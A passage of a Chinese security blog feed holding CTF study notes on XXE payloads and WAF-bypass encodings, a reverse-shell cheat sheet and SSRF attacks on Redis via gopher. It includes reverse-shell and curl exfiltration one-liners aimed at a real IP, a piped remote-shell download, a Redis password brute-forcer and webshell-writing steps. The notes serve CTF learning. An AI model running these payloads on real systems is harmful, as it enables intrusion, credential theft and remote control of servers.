&quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;app&#x2F;schema.dtd&quot;&gt;        &lt;!ENTITY % custom_entity &#39;&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;             &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:&#x2F;&#x2F;&#x2F;nonexistent&#x2F;&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;         &amp;#x25;eval;                &amp;#x25;error;&#39;&gt;        %local_dtd;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个DTD执行以下步骤:<br>定义名为local_dtd的XML参数实体，其中包含存在于服务器文件系统上的外部DTD文件的内容。<br>重新定义名为custom_entity的XML参数实体，该实体已经在外部DTD文件中定义。实体被重新定义为包含前面描述的基于错误的XXE漏洞，用于触发包含&#x2F;etc&#x2F;passwd文件内容的错误消息。<br>使用local_dtd实体，以便解释外部DTD，包括重新定义的custom_entity实体的值。这将导致所需的错误消息。<br>现实世界的例子:使用GNOME桌面环境的系统通常有一个DTD在&#x2F;usr&#x2F;share&#x2F;yelp&#x2F; DTD &#x2F;docbookx包含名为ISOamso的实体的dtd。</p><p> <img src="/images/fe48346aa420f04b034deb4bd532608a.png" alt="img"> </p><p>由于该技术使用内部DTD，所以首先需要找到一个有效的DTD。你可以安装相同的服务器正在使用的操作系统&#x2F;软件和搜索一些默认dtd，或抓取系统内的默认dtd列表，并检查其中是否存在。</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE foo [&lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;%local_dtd;]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://23c06661-6db4-492b-8882-7a9aa6c5c34d.challenge.ctf.show/"</span>data<span class="token operator">=</span><span class="token triple-quoted-string string">'''&lt;!DOCTYPE  xxe [&lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag">&lt;!ENTITY % xee SYSTEM "http://175.178.196.226/xxe.dtd">%xee;%send;]>&lt;root>&lt;/root>'''</span>         <span class="token comment">#js代码</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-16'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#requests.post(url,data=data.encode('utf-7'))</span><span class="token comment">#requests.post(url,data=data.encode('utf-16BE'))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编码绕过<br>base64</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE test [ &lt;!ENTITY % init SYSTEM &quot;data:&#x2F;&#x2F;text&#x2F;plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk&quot;&gt; %init; ]&gt;&lt;foo&#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>仅当XML服务器接受data:&#x2F;&#x2F;协议时，此方法才有效。</p><p>utf-7<br>直接上样例：</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-7&quot;?--&gt;+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-&#x2F;etc&#x2F;passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-&#x2F;productId+AD4-+ADw-storeId+AD4-1+ADw-&#x2F;storeId+AD4-+ADw-&#x2F;stockCheck+AD4-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用两种编码<br>思路是在同一个文档里同时使用两种编码，从而迷惑 WAF。直接用生成的命令来说明：</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">echo -n &#39;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-16BE&quot;?&gt;&#39; &gt; payload.xmlecho &#39;&lt;a&gt;1337&lt;&#x2F;a&gt;&#39; | iconv -f UTF-8 -t UTF-16BE &gt;&gt; payload.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>头部声明使用 UTF-8 编码，而之后使用 UTF-16 编码。当解析器读到 XML 声明的编码时，会切换到该编码（继续解析），即使该编码与声明部分所使用的编码不同。与此同时，WAF 一般不支持这种多种编码的 XML 文档。</p><p>在实体内编码<br>是新的XML技术，对内部实体中的任何DTD&#x2F;XML进行编码（编码格式是字符串16进制+UTF-8形式），达到WAF bypass的效果！<br>当没有XXE，但XML主体中存在漏洞(例如SQL注入)时起作用。</p><p> <img src="/images/01c50cfefa302534c320fa876f854f8f.png" alt="img"> </p><p>文档中的额外空格<br>由于XXE通常在XML文档的开头，所以比较省事儿的WAF可以避免处理整个文档，而只解析它的开头。但是，XML格式允许在格式化标记属性时使用任意数量的空格，因此攻击者可以在<?xml?>或&lt;!DOCTYPE&gt;中插入额外的空格，从而绕过此类WAF。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell</title>
      <link href="/2022/09/11/fan-dan-shell/"/>
      <url>/2022/09/11/fan-dan-shell/</url>
      
        <content type="html"><![CDATA[<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h2 id="使用bash"><a href="#使用bash" class="headerlink" title="使用bash"></a>使用bash</h2><p> bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;9999 &lt;&amp;1 </p><p>但是很多时候都是不成功的</p><p>使用shell执行脚本有两种方式，分别是bash xxx.sh和bash -c “cmd string”。<br>根据报错信息可知，目标主机使用的是sh，是bash的精简版本，相当于bash –posix模式。<br>Posix标准shell不提供此功能，这个特性很奇怪，假装有一个&#x2F;dev&#x2F;tcp&#x2F;目录。<br>    解决办法：以后默认使用bash -c “cmd string”进行反弹shell。</p><pre><code>成功反弹shell，值得注意的是，有时候会报错，建议尝试执行1-3遍：</code></pre><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token string">'bash -c \"bash -i >&amp; /dev/tcp/175.178.196.226/12345 0>&amp;1\"'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="使用curl"><a href="#使用curl" class="headerlink" title="使用curl"></a>使用curl</h2><p>外带数据</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://175.178.196.226/xxxget.php?a<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> /<span class="token operator">|</span>base64<span class="token variable">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> ctfshow群主写的反弹shell <a href="https://your-shell.com/">https://your-shell.com/</a>  </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Reverse Shell as a Service</span><span class="token comment"># https://ctf.show/</span><span class="token comment">#</span><span class="token comment"># 1. On your machine:</span><span class="token function">nc</span> <span class="token parameter variable">-l</span> <span class="token number">12345</span><span class="token comment">#</span><span class="token comment"># 2. On the target machine:</span><span class="token function">curl</span> https://your-shell.com/175.178.196.226:12345 <span class="token operator">|</span> <span class="token function">sh</span><span class="token comment">#</span><span class="token comment"># 3. Don't be a dick</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="使用nc-php一般使用nc"><a href="#使用nc-php一般使用nc" class="headerlink" title="使用nc(php一般使用nc)"></a>使用nc(php一般使用nc)</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> <span class="token number">175.178</span>.196.226 <span class="token number">12345</span> <span class="token parameter variable">-e</span> /bin/sh   <span class="token punctuation">(</span>一定要放后面这个<span class="token punctuation">)</span><span class="token function">nc</span> <span class="token number">175.178</span>.196.226 <span class="token number">12345</span> <span class="token parameter variable">-e</span> /bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI模板注入</title>
      <link href="/2022/09/11/ssti-mo-ban-zhu-ru/"/>
      <url>/2022/09/11/ssti-mo-ban-zhu-ru/</url>
      
        <content type="html"><![CDATA[<p>模板注入</p><p> 链接：<a href="https://pan.baidu.com/s/1b7FP7feXKBSEjazUCdNqOw?pwd=7rl1">https://pan.baidu.com/s/1b7FP7feXKBSEjazUCdNqOw?pwd=7rl1</a> 提取码：7rl1</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF</title>
      <link href="/2022/09/10/ssrf/"/>
      <url>/2022/09/10/ssrf/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>SSRF是一种攻击者通过构造数据进而伪造服务器端发起请求的漏洞。因为请求是由内部发起的，所以一般情况下，SSRF攻击的目标是从外网无法访问的内网系统。</p><p>SSRF形成的原因多是服务器提供了从外部服务获取数据的功能，但没有对目标地址、协议等重要参数进行过滤和限制，从而导致攻击者可以自由构造参数，发起预期外的请求。</p><h2 id="URL的结构："><a href="#URL的结构：" class="headerlink" title="URL的结构："></a>URL的结构：</h2><p><strong><font color="red">URL&#x3D; scheme:[&#x2F;&#x2F;authority]path[?query] [#fragment]</font></strong></p><p>authority分为以下3部分：</p><p><strong><font color="red">[userinfo@host] [:port]</font></strong></p><h3 id="scheme"><a href="#scheme" class="headerlink" title="scheme"></a>scheme</h3><p>有一串大小不敏感的字符组成，表示获取资源所需要的协议。</p><h3 id="authority"><a href="#authority" class="headerlink" title="authority"></a>authority</h3><p>其中的userinfo遇到较少。是一个可选项，一般HTTP使用匿名形式来获取数据，如果需要身份验证格式为<font color="red">username:password</font></p><p>以@结尾。</p><h3 id="host"><a href="#host" class="headerlink" title="host"></a>host</h3><p>表示在哪个服务器上获取资源，一般所见的是以域名形式呈现的</p><h3 id="port"><a href="#port" class="headerlink" title="port"></a>port</h3><p>服务器端口</p><p>http:80 ftp:21 使用默认端口是可以将端口省略</p><h3 id="path"><a href="#path" class="headerlink" title="path"></a>path</h3><p>指向资源的路径，一般用”&#x2F;“进行分层。</p><h3 id="query"><a href="#query" class="headerlink" title="query"></a>query</h3><p>查询字符串，用户将用户输入数据传递给服务端，以“？”作为表示。例如，向服务器传递用户名（GET传参）</p><h3 id="fragment"><a href="#fragment" class="headerlink" title="fragment"></a>fragment</h3><p>为片段ID，与query不同，内容不会被传递到服务器，一般用于表示页面锚点</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>?php     <span class="token keyword">function</span> curl<span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                   //curl函数用来发送请求        <span class="token variable">$ch</span> <span class="token operator">=</span> curl_init<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 //初始化curl        curl_setopt<span class="token punctuation">(</span><span class="token variable">$ch</span>,CURLOPT_URL,<span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //将参数URL代入        curl_setopt<span class="token punctuation">(</span><span class="token variable">$ch</span>,CURLOPT_HEADER,0<span class="token punctuation">)</span><span class="token punctuation">;</span>        curl_exec<span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    //执行请求该URL        curl_close<span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                       //用户通过构造url来进行访问curl<span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>页面ssrf.php实现的功能是获取GET参数URL,然后将URL的内容返回网页上。当设置参数为URL为内网地址时，则会泄露内网信息。当访问<code>.../ssrf.php?url=file:///C:/Windows/win.ini</code>即可读取本地文件。</p><p><font color="pink">只允许就绝对路径，不要有空格</font></p><p>file:&#x2F;&#x2F;&#x2F;etc&#x2F;password 三条斜线</p><h2 id="SSRF漏洞寻找测试"><a href="#SSRF漏洞寻找测试" class="headerlink" title="SSRF漏洞寻找测试"></a>SSRF漏洞寻找测试</h2><p>SSRF漏洞一般出现在有调用外部资源的场景中，如社交服务分享功能、图片识别服务、网站采集服务、远程资源请求（如wordpress xmlrpc.php）、文件处理服务（如XML解析）等。在对存在SSRF漏洞的应用进行测试的时候，可以尝试是否能控制、支持常见的协议，包括但不限于以下协议：</p><p>**<font color="red">file:&#x2F;&#x2F;：</font>**从文件系统中获取文件内容</p><p>PHP访问：</p><p>file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php 查看源代码可以看到文件源码</p><p>**<font color="red">dict:&#x2F;&#x2F;：</font>**字典服务器协议，让客户端能够访问更多字典源。在SSRF中可以获取目标服务器上运行的服务版本等信息<br>**<font color="red">gopher:&#x2F;&#x2F;：</font>**分布式的文档传递服务。使用Gopher协议时，童安格控制访问的URL可实现向指定的服务器发送任意内容，如HTTP请求、MySQL请求等，所以其攻击面非常广。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">URL:gopher://&lt;host>:&lt;port>/&lt;gopher-path>_后接TCP数据流<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>2.1.3.1 内部服务资产探测<br>SSRF漏洞可以直接探测网站所在服务器端口的开放情况甚至内网资产情况，如确定该处存在SSRF漏洞，则可以通过确定请求成功与失败的返回信息进行判断服务开放情况。<br>例：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests <span class="token keyword">as</span> req<span class="token keyword">import</span> timeports <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'80'</span><span class="token punctuation">,</span> <span class="token string">'3306'</span><span class="token punctuation">,</span> <span class="token string">'6379'</span><span class="token punctuation">,</span> <span class="token string">'8080'</span><span class="token punctuation">,</span> <span class="token string">'8000'</span><span class="token punctuation">]</span>session <span class="token operator">=</span> req<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">:</span>ip <span class="token operator">=</span> <span class="token string">'192.168.80.%d'</span> <span class="token operator">%</span> i<span class="token keyword">for</span> port <span class="token keyword">in</span> ports<span class="token punctuation">:</span>url <span class="token operator">=</span> <span class="token string">'http://example.com/?url=http://%s:%s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>res <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> timeout <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>content<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span><span class="token keyword">print</span> ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> <span class="token string">'is open'</span><span class="token keyword">except</span><span class="token punctuation">:</span><span class="token keyword">continue</span><span class="token keyword">print</span> <span class="token string">'DONE'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/882f2ab9001f448db2b89040fb689345.png" alt="在这里插入图片描述"></p><h3 id="使用Gopher协议扩展供给面"><a href="#使用Gopher协议扩展供给面" class="headerlink" title="使用Gopher协议扩展供给面"></a>使用Gopher协议扩展供给面</h3><p><font color="pink">Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。<br>gopher：gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议（俗称万能协议）</font></p><h4 id="1、攻击Redis"><a href="#1、攻击Redis" class="headerlink" title="1、攻击Redis"></a>1、攻击Redis</h4><h3 id="Redis认证攻击："><a href="#Redis认证攻击：" class="headerlink" title="Redis认证攻击："></a>Redis认证攻击：</h3><p>默认Redis是没有设置密码的，这时候我们可以直接访问，但是如果设置了密码，我们就要先对密码进行暴破，得到了正确的密码才能够进行进一步的攻击。</p><p>我们使用下面这个python脚本进行密码暴破，在脚本同目录下放一个文件名为password.txt的字典然后进暴破就可以了。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>request <span class="token keyword">import</span> Request<span class="token punctuation">,</span> urlopenurl <span class="token operator">=</span> <span class="token string">"http://192.168.48.133/ssrf.php?url="</span>gopher <span class="token operator">=</span> <span class="token string">"gopher://127.0.0.1:6379/_"</span><span class="token keyword">def</span> <span class="token function">get_password</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"password.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">encoder_url</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>    urlencoder <span class="token operator">=</span> quote<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"%0A"</span><span class="token punctuation">,</span> <span class="token string">"%0D%0A"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> urlencoder<span class="token keyword">for</span> password <span class="token keyword">in</span> get_password<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 攻击脚本</span>    cmd <span class="token operator">=</span> <span class="token triple-quoted-string string">"""    auth %s    quit    """</span> <span class="token operator">%</span> password    <span class="token comment"># 二次编码</span>    encoder <span class="token operator">=</span> encoder_url<span class="token punctuation">(</span>encoder_url<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># 生成payload</span>    payload <span class="token operator">=</span> url <span class="token operator">+</span> gopher <span class="token operator">+</span> encoder    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token comment"># 发起请求</span>    request <span class="token operator">=</span> Request<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    response <span class="token operator">=</span> urlopen<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"This time password is:"</span> <span class="token operator">+</span> password<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Get response is:"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span>    <span class="token keyword">if</span> response<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">"+OK"</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"find password : "</span> <span class="token operator">+</span> password<span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Password not found!"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Please change the dictionary,and try again."</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里我们随便写几个密码来示范。</p><p><img src="/images/1612775623_602100c7f2e39b25fac58.png!small" alt="img"></p><p><img src="/images/1612775639_602100d75f731714de30f.png!small" alt="img"></p><p>可以看到，成功找到了密码。</p><h5 id="RESP协议"><a href="#RESP协议" class="headerlink" title="RESP协议"></a>RESP协议</h5><p><code>Redis</code>服务器与客户端通过<font color="pink">RESP</font>（REdis Serialization Protocol）协议通信。</p><blockquote><p>在RESP中，某些数据的类型取决于第一个字节：<br>对于<code>Simple Strings</code>，回复的第一个字节是<code>+</code><br>对于<code>error</code>，回复的第一个字节是<code>-</code><br>对于<code>Integer</code>，回复的第一个字节是<code>:</code><br>对于<code>Bulk Strings</code>，回复的第一个字节是<code>$</code><br>对于<code>array</code>，回复的第一个字节是<code>*</code><br>此外，<code>RESP</code>能够使用稍后指定的<code>Bulk Strings</code>或<code>Array</code>的特殊变体来表示<code>Null</code>值。<br>在RESP中，协议的不同部分始终以<code>&quot;\r\n&quot;(CRLF)</code>结束。</p></blockquote><p>我们用<code>tcpdump</code>来抓个包来测试一下</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml">tcpdump port 6379 <span class="token punctuation">-</span>w ./Desktop/1.pcap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>redis客户端中执行如下命令</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token number">192.168</span><span class="token number">.163</span><span class="token number">.128</span><span class="token operator">:</span><span class="token number">6379</span><span class="token operator">></span> set name test<span class="token constant">OK</span><span class="token number">192.168</span><span class="token number">.163</span><span class="token number">.128</span><span class="token operator">:</span><span class="token number">6379</span><span class="token operator">></span> get name<span class="token string-literal"><span class="token string">"test"</span></span><span class="token number">192.168</span><span class="token number">.163</span><span class="token number">.128</span><span class="token operator">:</span><span class="token number">6379</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>抓到的数据包如下</p><p><img src="/images/640.png" alt="img"></p><p>hex转储看一下</p><p><img src="/images/640.png" alt="img"></p><p>正如我们前面所说的，客户端向将命令作为<code>Bulk Strings</code>的RESP数组发送到Redis服务器，然后服务器根据命令实现回复给客户端一种RESP类型。<br>我们就拿上面的数据包分析，首先是<code>*3</code>，代表数组的长度为3（可以简单理解为用空格为分隔符将命令分割为[“set”,”name”,”test”]）；<code>$4</code>代表字符串的长度，<code>0d0a</code>即<code>\r\n</code>表示结束符；<code>+OK</code>表示服务端执行成功后返回的字符串</p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p><font color="pink" size=4>能未授权或者能通过弱口令认证访问到Redis服务器</font></p><h1 id="gopher协议扩展攻击面"><a href="#gopher协议扩展攻击面" class="headerlink" title="gopher协议扩展攻击面"></a>gopher协议扩展攻击面</h1><h2 id="gopher提交post和get请求"><a href="#gopher提交post和get请求" class="headerlink" title="gopher提交post和get请求"></a>gopher提交post和get请求</h2><h3 id="get"><a href="#get" class="headerlink" title="get"></a>get</h3><p>get请求的发送</p><p>用burpsuite抓包复制整体的http请求 </p><img src="https://img-blog.csdnimg.cn/20200713225922653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTg4NzMxMQ==,size_16,color_FFFFFF,t_70"><p>可以删除些信息（留下第一行和HOST行），然后需要对http请求URL编码，添加%0d%0a（换行表示HTPP请求结束）</p><p>GET &#x2F;ssrf&#x2F;get.php?name&#x3D;yanshu HTTP&#x2F;1.1<br>Host: 192.168.0.111</p><p>gopher请求: （gopher的<strong>请求体</strong>前一定不能漏了_）<br>curl <font color="pink">gopher:&#x2F;&#x2F;192.168.0.111:80&#x2F;_GET%20&#x2F;ssrf&#x2F;get.php%3Fname%3Dyanshu%20HTTP&#x2F;1.1%0D%0AHost%3A%20192.168.0.111%0D%0A</font></p><h4 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h4><p><font color="pink">1、问号（？）需要转码为URL编码，也就是%3f<br>2、回车换行要变为%0d%0a,但如果直接用工具转，可能只会有%0a <br>3、在HTTP包的最后要加%0d%0a，代表消息结束（具体可研究HTTP包结束）</font></p><h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><p>有4个参数为必要参数，参与与post数据之间只需要空开一行<strong>（如果多空一行，会认为http协议请求结束，因为http协议最后用换行来表示结束）</strong></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">POST /ssrf/base/post.php HTTP/1.1host:192.168.0.109Content-Type:application/x-www-form-urlencodedContent-Length:11name=Margin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>步骤：</p><p>将POST请求进行URL编码（末尾加上%0A）：</p><p>将%0A换为%0d%0A</p><p>gopher的<strong>请求体</strong>前一定不能漏了_</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">gopher://192.168.0.111:80/_POST%20/ssrf/base/post.php%20HTTP/1.1%0d%0AHost:192.168.0.109%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:11%0d%0A%0d%0Aname=Margin%0d%0A<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="URL编码次数："><a href="#URL编码次数：" class="headerlink" title="URL编码次数："></a>URL编码次数：</h3><p>URL编码的次数主要取决于你请求的次数，比如你直接POST请求算一次，然后我是直接?url打的，因此再加一次是2次。</p><h2 id="redis常见的SSRF攻击方式大概有这几种："><a href="#redis常见的SSRF攻击方式大概有这几种：" class="headerlink" title="redis常见的SSRF攻击方式大概有这几种："></a>redis常见的SSRF攻击方式大概有这几种：</h2><ol><li><strong>绝对路径</strong>写webshell</li><li>写ssh公钥</li><li>写contrab计划任务反弹shell</li></ol><p><font color="yellow">当通过参数的SSRF用gopher协议攻击Redis时注意：</font></p><p>在gopherus跑出来的gopher payload后</p><p>先进行URL编码</p><p>编码后删去save后面的字符，再加上</p><p><font color="yellow">%250D%250Aquit%250D%250A（相当于在redis指令后面加上quit指令）</font></p><p>否则会一直请求，无法结束返回</p><p>下面我们逐个实现</p><h3 id="绝对路径写webshell-gopher"><a href="#绝对路径写webshell-gopher" class="headerlink" title="绝对路径写webshell(gopher)"></a>绝对路径写webshell(gopher)</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token 